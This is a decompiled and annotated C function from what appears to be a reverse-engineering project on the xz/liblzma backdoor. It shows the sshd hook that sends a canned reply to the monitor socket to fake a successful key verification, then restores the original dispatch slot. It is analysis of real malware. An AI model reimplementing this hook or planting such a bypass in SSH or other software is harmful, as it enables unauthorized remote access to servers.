// /home/kali/xzre-ghidra/xzregh/108080_mm_answer_keyverify_hook.c
// Function: mm_answer_keyverify_hook @ 0x108080
// Calling convention: __stdcall
// Prototype: int __stdcall mm_answer_keyverify_hook(ssh * ssh, int sock, sshbuf * m)


/*
 * AutoDoc: Short-circuits `MONITOR_REQ_KEYVERIFY` by streaming the payload-staged reply instead of running sshd’s verifier. Once
 * `global_ctx` exposes libc imports and `sshd_ctx` recorded a reply length/buffer, the hook writes the blob to the monitor
 * socket, restores the saved dispatch slot, and reports success; missing metadata or a failed write triggers libc’s
 * `exit(0)` so sshd never continues with a partially installed hook.
 */

#include "xzre_types.h"

int mm_answer_keyverify_hook(ssh *ssh,int sock,sshbuf *m)

{
  libc_imports_t *libc_imports;
  sshd_ctx_t *sshd_ctx;
  ssize_t write_result;
  
  if (global_ctx == 0) {
    return 0;
  }
  libc_imports = *(libc_imports_t **)(global_ctx + 0x10);
  if ((libc_imports != (libc_imports_t *)0x0) && (sshd_ctx = *(long *)(global_ctx + 0x20), sshd_ctx != 0)) {
    // AutoDoc: Only run when keyallowed already staged both the reply length and buffer; otherwise keep sshd’s original handler.
    if ((*(ushort *)(sshd_ctx + 0x84) != 0) &&
       ((*(void **)(sshd_ctx + 0x88) != (void *)0x0 &&
        // AutoDoc: Send the canned reply straight to the monitor socket so sshd believes the keyverify exchange already succeeded.
        (write_result = fd_write(sock,*(void **)(sshd_ctx + 0x88),(ulong)*(ushort *)(sshd_ctx + 0x84),libc_imports),
        -1 < write_result)))) {
      // AutoDoc: Drop the preserved mm_answer_keyverify pointer back into the live dispatch slot before returning success.
      **(undefined8 **)(sshd_ctx + 0xa0) = *(undefined8 *)(sshd_ctx + 0xd8);
      return 1;
    }
    // AutoDoc: Any missing metadata or short write forces an immediate `exit(0)` so sshd never continues with a half-applied hook.
    if (libc_imports->exit != (pfn_exit_t)0x0) {
      (*libc_imports->exit)(0);
    }
  }
  return 0;
}

